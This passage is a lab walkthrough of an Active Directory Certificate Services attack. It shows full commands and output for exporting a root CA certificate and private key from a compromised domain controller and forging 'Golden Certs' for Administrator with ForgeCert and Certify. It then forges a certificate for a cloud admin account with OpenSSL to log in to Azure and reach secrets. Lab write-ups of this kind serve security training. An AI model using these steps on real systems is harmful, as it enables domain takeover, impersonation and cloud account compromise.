- These two forests are configured to share the same CA for Cross Forest Certificate Enrollment using a bidirectional cross forest trust as we saw previously (`FOREST_TRANSITIVE` and `bidirectional` trust).
- Since we have compromised **CBI-DC** we can try to steal the RootCA certificates. These are certificates that are self-signed by their respective CA.
- In such a case the RootCA certificate is added to the target forest sharing the source forest CA, so the RootCA certificate of `cb.corp` is added to `internalcb.corp` so that the second can use the RootCA as the CA of the forest.
- Only the RootCA certificate needs to added, but careless handling results in storing the RootCA along with the private key.

- Let's try to hunt the RootCA in **CBI-DC**.
```powershell
PS C:\Users\Administrator> certutil -store -enterprise Root
certutil -store -enterprise Root
Root "Trusted Root Certification Authorities"
================ Certificate 0 ================
Serial Number: 51f5aa83c01b57b34635410a3738e79d
Issuer: CN=CB-CA, DC=cb, DC=corp
 NotBefore: 1/11/2023 5:46 AM
 NotAfter: 1/11/2028 5:56 AM
Subject: CN=CB-CA, DC=cb, DC=corp
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Cert Hash(sha1): 75e734ee4bb472bd99ff2e308de9b95eeaf80c3f
  Key Container = CB-CA
  Unique container name: 2ea5d0165c630bfb0ab1b134ba5d88aa_5fc51973-fd50-4bef-818a-a07b73736e8f
  Provider = Microsoft Software Key Storage Provider
Private key is NOT plain text exportable
Signature test passed
CertUtil: -store command completed successfully.
```

- Let's try to exfiltrate the RootCA so we can use it to craft a Golden Cert.
```powershell
PS C:\Users\Administrator> certutil -exportpfx -p certpass -enterprise Root 51f5aa83c01b57b34635410a3738e79d C:\Windows\Tasks\RootCA.p12
certutil -exportpfx -p certpass -enterprise Root 51f5aa83c01b57b34635410a3738e79d C:\Windows\Tasks\RootCA.p12
Root "Trusted Root Certification Authorities"
================ Certificate 0 ================
Serial Number: 51f5aa83c01b57b34635410a3738e79d
Issuer: CN=CB-CA, DC=cb, DC=corp
 NotBefore: 1/11/2023 5:46 AM
 NotAfter: 1/11/2028 5:56 AM
Subject: CN=CB-CA, DC=cb, DC=corp
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Cert Hash(sha1): 75e734ee4bb472bd99ff2e308de9b95eeaf80c3f
  Key Container = CB-CA
  Unique container name: 2ea5d0165c630bfb0ab1b134ba5d88aa_5fc51973-fd50-4bef-818a-a07b73736e8f
  Provider = Microsoft Software Key Storage Provider
Private key is NOT plain text exportable
Signature test passed
CertUtil: -exportPFX command completed successfully.
```

- Since we now have the RootCa certificate we can use it to execute a Golden Cert attack and impersonate any user we want, establishing long-term persistence in the domain/enterprise.
```powershell
PS C:\ADCS\Auditor> C:\ADCS\Auditor\ForgeCert\ForgeCert.exe --CaCertPath "C:\ADCS\Auditor\Loot\RootCA.p12" --CaCertPassword certpass --Subject "CN=Administrator,CN=Users,DC=cb,DC=corp" --SubjectAltName administrator@cb.corp --NewCertPath "C:\ADCS\Auditor\Loot\forged-cb_ea.pfx" --NewCertPassword certpass
CA Certificate Information:
  Subject:        CN=CB-CA, DC=cb, DC=corp
  Issuer:         CN=CB-CA, DC=cb, DC=corp
  Start Date:     1/11/2023 4:46:01 AM
  End Date:       1/11/2028 4:56:01 AM
  Thumbprint:     75E734EE4BB472BD99FF2E308DE9B95EEAF80C3F
  Serial:         51F5AA83C01B57B34635410A3738E79D

Forged Certificate Information:
  Subject:        DC=corp, DC=cb, CN=Users, CN=Administrator
  SubjectAltName: administrator@cb.corp
  Issuer:         CN=CB-CA, DC=cb, DC=corp
  Start Date:     9/23/2023 2:43:28 AM
  End Date:       9/23/2024 2:43:28 AM
  Thumbprint:     8074E0E302BC32963A439AC997F0E604D7B31CFA
  Serial:         009C92F48E04BE975A63BBE040366EF8A2

Done. Saved forged certificate to C:\ADCS\Auditor\Loot\forged-cb_ea.pfx with the password 'certpass'
```

- We can now use the certificate to request a TGT for any User/Machine we want on the `cb.corp` domain.
```powershell
PS C:\ADCS\Auditor> .\Certify.exe request /ca:cb-ca.cb.corp\CB-CA /template:User /onbehalfof:cb\administrator /enrollcert:"C:\ADCS\Auditor\Loot\forged-cb_ea.pfx" /enrollcertpw:certpass /domain:cb.corp /dc:cb-ca.cb.corp /sidextension:S-1-5-21-2928296033-1822922359-262865665-500

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : CERTBULK\student33

[*] Template                : User
[*] On Behalf Of            : cb\administrator

[*] Certificate Authority   : cb-ca.cb.corp\CB-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 64

<snip>
```

- We can use that attack to craft Golden Certs for any of the domains that use **CB-CA** as their CA (`internalcb.corp`, `certbulk.cb.corp`, `cb.corp`).

## `certbulk.onmicrosoft.com` ##

- When enumerating the root domain `cb.corp` we discovered an interesting user, `cb\cloudadmin`.
- We can attempt to forge a certificate for `cb\cloudadmin` in order to access the cloud resources.

- Extract the private key from the `.p12` format to a `.key` format.
```
PS C:\ADCS\MyTools> C:\ADCS\Tools\openssl\openssl.exe pkcs12 -in C:\ADCS\MyTools\Certificates\CB-CA.p12 -nocerts -out C:\ADCS\MyTools\Certificates\CB-CA.key
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Import Password:
MAC verified OK
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```

- Extract the certificate into a `.crt` format.
```
PS C:\ADCS\MyTools> C:\ADCS\Tools\openssl\openssl.exe pkcs12 -in C:\ADCS\MyTools\Certificates\CB-CA.p12 -clcerts -nokeys -out C:\ADCS\MyTools\Certificates\CB-CA.crt
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Import Password:
MAC verified OK
```

- We will now create and properly store all the necessary CA related configuration files and certificates needed.
```
PS C:\ADCS\MyTools\Cloud> mkdir .\CA
PS C:\ADCS\MyTools\Cloud> mkdir .\CA\ca
PS C:\ADCS\MyTools\Cloud> mkdir .\CA\ca\ca.db.certs
```

```
C:\Users\student33>cd C:\ADCS\MyTools\Cloud\CA\ca

C:\ADCS\MyTools\Cloud\CA\ca>copy NUL ca.db.index
        1 file(s) copied.

C:\ADCS\MyTools\Cloud\CA\ca>echo 1336>C:\ADCS\MyTools\Cloud\CA\ca\ca.db.serial
```

```
PS C:\ADCS\MyTools\Cloud\CA> type C:\ADCS\MyTools\Cloud\CA\ca.conf
# Add the following contents
default_ca = ca_default
[ ca_default ]
dir = C:/ADCS/MyTools/Cloud/CA/ca
certs = $dir
new_certs_dir = $dir/ca.db.certs
database = $dir/ca.db.index
serial = $dir/ca.db.serial
RANDFILE = $dir/ca.db.rand
certificate = $dir/ca.crt
private_key = $dir/ca.key
default_days = 365
default_crl_days = 30
default_md = md5
preserve = no
policy = generic_policy
[ generic_policy ]
countryName = optional
stateOrProvinceName = optional
localityName = optional
organizationName = optional
organizationalUnitName = optional
commonName = optional
emailAddress = optional
[req]
x509_extensions = usr_cert
req_extensions = v3_req
[ usr_cert ]
subjectAltName = @alt_names
[ v3_req ]
subjectAltName = @alt_names
[alt_names]
otherName=1.3.6.1.4.1.311.20.2.3;UTF8:cloudadmin@certbulk.onmicrosoft.com
```

```
PS C:\ADCS\MyTools\Cloud\CA> type C:\ADCS\MyTools\Cloud\CA\san.conf
# Add the following contents
[req]
x509_extensions = usr_cert
req_extensions = v3_req
distinguished_name = req_distinguished_name
[req_distinguished_name]
[ usr_cert ]
subjectAltName = @alt_names
[ v3_req ]
subjectAltName = @alt_names
[alt_names]
otherName=1.3.6.1.4.1.311.20.2.3;UTF8:cloudadmin@certbulk.onmicrosoft.com
```

- Create a CSR using the generated configuration.
```
PS C:\ADCS\MyTools\Cloud\CA> C:\ADCS\Tools\openssl\openssl.exe req -new -sha256 -config C:\ADCS\MyTools\Cloud\CA\san.conf -newkey rsa:4096 -nodes -keyout "C:\ADCS\MyTools\Certificates\cloudadmin@certbulk.onmicrosoft.com-key.pem" -out "C:\ADCS\MyTools\Certificates\cloudadmin@certbulk.onmicrosoft.com-req.pem" -subj "/C=IN/ST=MH/L=MU/O=AS/OU=AZ/CN=cloudadmin@certbulk.onmicrosoft.com"
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Generating a RSA private key
............................................................................................................++++
....................................++++
writing new private key to 'C:\ADCS\MyTools\Certificates\cloudadmin@certbulk.onmicrosoft.com-key.pem'
-----
```

- Sign the CSR with the ADCS Root certificate.
```
PS C:\ADCS\MyTools\Cloud\CA> C:\ADCS\Tools\openssl\openssl.exe ca -md sha256 -config C:\ADCS\MyTools\Cloud\CA\ca.conf -extensions v3_req -out "C:\ADCS\MyTools\Certificates\cloudadmin@certbulk.onmicrosoft.com-certificate.pem.crt" -infiles "C:\ADCS\MyTools\Certificates\cloudadmin@certbulk.onmicrosoft.com-req.pem"
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Using configuration from C:\ADCS\MyTools\Cloud\CA\ca.conf
Enter pass phrase for C:/ADCS/MyTools/Cloud/CA/ca/ca.key:
Check that the request matches the signature
Signature ok
The Subject's Distinguished Name is as follows
countryName           :PRINTABLE:'IN'
stateOrProvinceName   :ASN.1 12:'MH'
localityName          :ASN.1 12:'MU'
organizationName      :ASN.1 12:'AS'
organizationalUnitName:ASN.1 12:'AZ'
commonName            :ASN.1 12:'cloudadmin@certbulk.onmicrosoft.com'
Certificate is to be certified until Sep  6 09:03:14 2024 GMT (365 days)
Sign the certificate? [y/n]:y


1 out of 1 certificate requests certified, commit? [y/n]y
Write out database with 1 new entries
Data Base Updated
```

- Convert the `.pem` certificate and private key to a `.pfx` format.
```
PS C:\ADCS\MyTools\Cloud\CA> C:\ADCS\Tools\openssl\openssl.exe pkcs12 -inkey "C:\ADCS\MyTools\Certificates\cloudadmin@certbulk.onmicrosoft.com-key.pem" -in "C:\ADCS\MyTools\Certificates\cloudadmin@certbulk.onmicrosoft.com-certificate.pem.crt" -export -out "C:\ADCS\MyTools\Certificates\cloudadmin@certbulk.onmicrosoft.com.pfx"
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:
```

- Import this Certificate using `certutil` in order to use it for Certificate-Based Authentication (CBA).
```
PS C:\ADCS\MyTools\Cloud\CA> certutil -user -p "Passw0rd!" -importpfx C:\ADCS\MyTools\Certificates\cloudadmin@certbulk.onmicrosoft.com.pfx
Certificate "cloudadmin@certbulk.onmicrosoft.com" added to store.

CertUtil: -importPFX command completed successfully.
```

- Go to https://portal.azure.com/ and enter our Azure AD login: cloudadmin@certbulk.onmicrosoft.com.
- When prompted, select the imported certificate.
- Go to _All Resources_ to find the secrets.